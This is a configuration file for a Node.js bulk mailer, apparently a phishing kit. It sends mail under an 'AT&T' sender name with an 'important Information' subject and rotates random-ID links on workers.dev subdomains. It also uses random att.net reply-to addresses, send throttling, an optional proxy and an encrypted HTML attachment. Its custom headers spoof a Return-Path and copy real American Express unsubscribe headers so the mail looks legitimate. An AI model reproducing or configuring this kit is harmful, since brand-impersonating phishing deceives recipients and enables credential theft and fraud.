uuid = require("uuid") // dont touch

// Message Info
exports.message = [
	
	{
		fromName	: "AT&T",
		fromEmail	: "{smtp_user}",		
		subject		: "important Information",
	},
	
];

// Multy shortlink
exports.shortlink = [
	
	"https://jrkjkfsdjkjfds.hermq.workers.dev/?id={random_letternumberuplow_10}",
	"https://jrkjkfsd.hermq.workers.dev/?id={random_letternumberuplow_10}",
	"https://jmiu.hermq.workers.dev/?id={random_letternumberuplow_10}",
	" https://tbl.hermq.workers.dev/?id={random_letternumberuplow_10}",
	"https://akwa.hermq.workers.dev/?id={random_letternumberuplow_10}",
];


//set your reply-to email below 
exports.reply2 = [
"{random_letternumberuplow_10}@att.net",

];


exports.send = {
	delay			: 5, // Seconds per send
	pauseAfter		: 1, // Pause after how many emails
	pauseFor		: 2, // Pause for how many seconds
	useHeader		: false, // if true it will use the custom header set at custom_headers
	useAttach		: false, // if true it will use the attachment that is set in the attachment
	isAttachimgs	: false, // if true embed the images
	useHttpProxy	: false, // if true then send will use the http proxy that has been set
	text			: "", // this is the text version of the html letter, it will be displayed if the html cannot be displayed
	letter 			: "letter.html", // HTML Message
	list 			: "emails.txt"  // Emails File Name
};





// Proxy  if u want run anything like proxy..Remember you can only use a http proxy. socks is not supported
//remeber to set the usehttpproxy to true above
exports.proxy = {
	http 	: "127.0.0.1:6200" 
};


//if u dont want use as link,but want to embed image to the letter
//filename is any name you want you image to be called 
// path is the path to the image
// cid is the name you use in ur image src eg: <img src="cid:images">
exports.imgs = [
	{
	filename: "images.png", // The embedded image
	path: "./images.png",
	cid: "images", // This is referenced in the HTML
  }
] 

//below is the attachment attachment settings
//file is the path to the file
//set encrypt to true if u want to encrypt the file
//fileName is the name u want the file to be called when is is delivered to the reciever of the email
exports.attach = {
	file 	: "output.html" ,// Attach File can be pdf or anything
	encrypt : true,
	fileName : "output.html"
};

//below is where u can set the custom headers
exports.custom_headers = {
	Returnpath 	: "Peter <ryuchan@aol.com>", // can be filled at will but can't use random tags
	"List-Unsubscribe-Post": "List-Unsubscribe=One-Click",
	"List-Unsubscribe" : "<https://click.member.americanexpress.com/subscription_center.aspx?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtaWQiOiI3MjAxNzgxIiwicyI6IjE4MDA0OTg4MiIsImxpZCI6IjIxIiwiaiI6IjMxNTY2ODciLCJqYiI6IjEyOTMiLCJkIjoiNzAyNDUifQ.GctYBzqlHCf4wuIECjpoWwVqmpO_e6qorCHy6YZBg7w>, <mailto:leave-fd8816711a3c402029-fe271578756400747d1c72-fe8b17717062027572-fe9513727565037574-ff3015727c67@leave.member.americanexpress.com>",
	"List-ID": uuid.v4(),
	"Message-ID": uuid.v4(),

};